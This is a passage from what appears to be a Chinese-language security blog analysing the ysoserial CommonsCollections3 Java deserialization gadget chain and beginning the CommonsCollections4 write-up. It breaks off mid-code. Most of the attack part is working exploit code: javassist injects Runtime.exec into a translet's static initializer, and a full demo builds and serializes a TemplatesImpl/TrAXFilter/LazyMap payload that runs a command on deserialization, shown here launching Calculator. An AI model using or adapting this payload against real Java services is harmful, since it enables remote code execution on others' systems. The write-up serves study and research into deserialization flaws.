<p>之前的CommonsCollections1使用的是InvokerTransformer的transform，因为该函数实现了反射调用任意类的功能。而CommonsCollection3使用的是新的Transformer类<font color=#008000><code>InstantiateTransformer</code></font>类。该类有什么作用呢？接下来会对其进行分析。</p>
<p>首先关注一下整个的利用链:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt;Proxy(LazyMap).entrySet()</span><br><span class="line">    -&gt;LazyMap.get()</span><br><span class="line">	   -&gt;ChainedTransformer.transform()</span><br><span class="line">		  -&gt;constantTransformer(TrAXFilter.class)</span><br><span class="line">			 -&gt;InstantiateTransformer.transform()</span><br><span class="line">				-&gt;Constructor.newInstance()</span><br><span class="line">				  -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">					 -&gt;TemplatesImpl.getTransletInstance()</span><br><span class="line">						-&gt;TemplatesImpl.defineTransletClasses()</span><br><span class="line">						  -&gt;AbstractTranslet.newInstance()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>由于前面的构造与1一致，这里我们直接看InstantiateTransformer类的<code>tranform</code>方法，它会对当前传入的类进行实例化，那么传入哪个类呢？</p>
<p><img src="1.png" alt=""></p>
<p>这里就要介绍<font color=#008000><code>TrAXFilter</code></font>类，在Payload中使用的此类进行实例化，在其构造函数中可以看到它调用了<code>templates.newTransformer()</code>，templates是实例化时传入的参数<code>this.iArgs</code>，可以看到它是一个<code>Templates</code>类。</p>
<p><img src="2.png" alt=""></p>
<p>跟进这个newTransformer()函数，可以发现它实例化了一个TransformerImpl类，在其中调用了<code>getTransletInstance()</code>函数，跟进这个函数。</p>
<p><img src="3.png" alt=""></p>
<p>跟进这个函数后，可以看到它经过2个判断后，会调用到<code>defineTransletClasses()</code>函数。调用完这个函数后，在其后对<code>_class[_transletIndex]</code>这个类进行实例化，生成了AbstractTranslet对象。最后返回这个对象。</p>
<p><img src="4.png" alt=""></p>
<p>若<code>_class[_transletIndex]</code>的构造方法或者静态块中存在可控的命令执行，那么就会产生RCE。接下来跟进<code>defineTransletClasses()</code>函数。</p>
<p><img src="5.png" alt=""></p>
<p>首先会实例化一个loader，然后调用<code>defineClass()</code>函数，跟进一步可以发现，它实际上调用的是ClassLoader类的defineClass()函数。这个函数的作用是从byte数组中恢复一个Class。这是ClassLoader从byte数组中还原Class的方法。若<code>_bytecodes</code>是可控的，那么就可以加载任意类，且在后续的实例化中会达到任意命令执行。</p>
<p><code>_bytecodes</code>是TemplatesImpl对象的一个成员。在一开始<code>TrAFilter</code>实例化时可以传入一个TemplatesImpl对象。所以，整个反序列化的链就出来了。</p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>由分析可知，利用的是<code>TrAxFilter</code>类的实例化函数，首先需要获取到<code>TrAxFilter</code>类。使用ConstantTransformer即可。然后此类在实例化时传入的是TemplatesImpl类，因此InstantiateTranformer的参数为TemplatesImpl。ChainedTransformer链的构造如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>其中templates为一个特定的TemplatesImpl对象。在上面的分析中可以得知，该对象的<code>_bytecodes</code>值中是能执行命令的恶意类的字节码。恶意类如何构造呢？</p>
<p>在构造恶意类时，ysoserial使用了javassist来对静态块注入任意代码。首先该类必须继承<code>AbstractTranslet</code>，并且能够被反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于StubTransletPayload继承自抽象类，所以其子类中必须实现transform方法。而且其成员变量必须用final关键字修饰。</p>
</blockquote>
<p>然后在通过javassist来向静态块中插入任意代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义插入的代码</span></span><br><span class="line">String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入代码</span></span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置其父类</span></span><br><span class="line">CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将其转化为字节码        </span></span><br><span class="line"><span class="keyword">byte</span>[] classBytes = clazz.toBytecode();        </span><br></pre></td></tr></table></figure>

<p>到此为止，恶意类构造完了，接下来需要的是保证反序列化链中的相应的函数能够被调用到，由于可控的是TemplatesImpl，从与它相关的函数调用分析。在newTransformer()函数中，调用了getTransletInstance()函数，在这之前没有其他分支，进入此函数。首先<code>_name</code>成员变量不能为空，否则直接返回null。其次<code>_class</code>成员变量必须为空才能进入<code>defineTransletClasses()</code>函数。进入此函数，可以看到首先<code>_bytecodes</code>函数不能为空，然后在生成loader对象时，需要对<code>_tfactory</code>成员变量赋值。其次，在从字节码中加载了类之后，会判断其父类必须等同于<code>ABSTRACT_RANSLET</code>。这就是为什么上面的代码中会对其父类进行设置。</p>
<p>对于TemplatesImpl的其他设置如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成一个TemplatesImpl对象</span></span><br><span class="line">Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得TemplatesImpl的成员变量，将_bytecodes设置为此类的bytecode</span></span><br><span class="line">Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得TemplatesImpl的成员变量，将_name设置为任意不为空的值。ysoserial在这里对name设置的是一个随机值，为了重复使用。</span></span><br><span class="line">Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得TemplatesImpl的成员变量，设置_tfactory。</span></span><br><span class="line">Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>在这里出现了一个Foo.class。事实上_bytecodes是一个byte[][]。需要2个class的字节码，Foo.class就是一个实现了Serializable的空类。</p>
</blockquote>
<h2 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        ClassLoader loader = lazyMap.getClass().getClassLoader();</span><br><span class="line">        Class[] interfaces = lazyMap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(loader,interfaces,handler);</span><br><span class="line"></span><br><span class="line">        Constructor cttor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cttor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">mapProxy</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(handler1);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中对Foo.class转换为bytecode的代码，直接使用了ysoserial中的<code>ClassFiles</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classFiles</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classAsFile(clazz, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">boolean</span> suffix)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getEnclosingClass() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            str = clazz.getName().replace(<span class="string">"."</span>, <span class="string">"/"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str = classAsFile(clazz.getEnclosingClass(), <span class="keyword">false</span>) + <span class="string">"$"</span> + clazz.getSimpleName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (suffix) &#123;</span><br><span class="line">            str += <span class="string">".class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">final</span> String file = classAsFile(clazz);</span><br><span class="line">            <span class="keyword">final</span> InputStream in = classFiles<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>().<span class="title">getResourceAsStream</span>(<span class="title">file</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (in == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"couldn't find '"</span> + file + <span class="string">"'"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="6.png" alt=""></p>
<p>可以看到弹出计算器的同时，也出现了一些报错信息。对于这些报错信息，ysoserial作者回应，在很多payload中会有这些错误的出现，但并不影响代码的执行。可参考<a href="https://github.com/frohoff/ysoserial/issues/69" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/issues/69</a>。</p>
<p><img src="7.jpeg" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.cnblogs.com/tr1ple/p/12201553.html#toc-1" target="_blank" rel="noopener">从0到1掌握某Json-TemplatesImpl链与ysoserial-jdk7u21的前因后果</a></li>
<li><a href="http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3-3/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections3</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections4</title>
    <url>/2020/04/26/ysoserial-analyze-4/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections4，它与CommonsCollections2一样都是针对commonscollections4.0版本的利用链。它像是CommonsCollections2与CommonsCollections3的结合版。前面使用了2中的Priority类，后面用到了TrAXFilter类。</p>
<a id="more"></a>

<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a></p>
<p>CommonsCollection4与CommonsCollections2一样，都用到了<code>Priority</code>类中的<code>comparator</code>来触发<code>transform</code>函数。不同的是CommonsCollections2利用的是<code>InvokerTransformer</code>的反射机制来调用到TemplatesImpl对象的newTransformer函数。而4中利用的是在CommonsCollections3中提到过可以利用<code>TrAXFilter</code>类的初始化来加载TemplatesImpl类，从而在该类实例化时执行任意命令。</p>
<p>首先看一下整体的反序列化链。由于不再利用InvoerTransformer类，Priority类的queue成员变量放入的元素就可以随意了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">  -&gt;heapify()</span><br><span class="line">	-&gt;siftDown()</span><br><span class="line">	  -&gt;siftDownUsingComparator()</span><br><span class="line">		-&gt;comparator.compare()</span><br><span class="line">		  -&gt;ChainedTransformer.transform()</span><br><span class="line">			-&gt;ConstantTransformer.transform()</span><br><span class="line">			-&gt;InstantiateTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>由于整个链在前面分别地分析过，这里就不再分析，直接构造payload。</p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>整个payload的构造主要是ChainedTransformer的构造，这部分可以参考CommonsCollections3的构造。其次是Priority对象的构造，将其成员变量comparator赋值为TransformingComparator对象，而TransformingComparator对象实例化时，传入了构造好的chainedTransformer。</p>
<p>完整的demo如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">         String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">         String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                 command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                 <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">         Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">         ClassPool pool = ClassPool.getDefault();</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">         clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">         CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">         clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">         Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">         Field field2 = 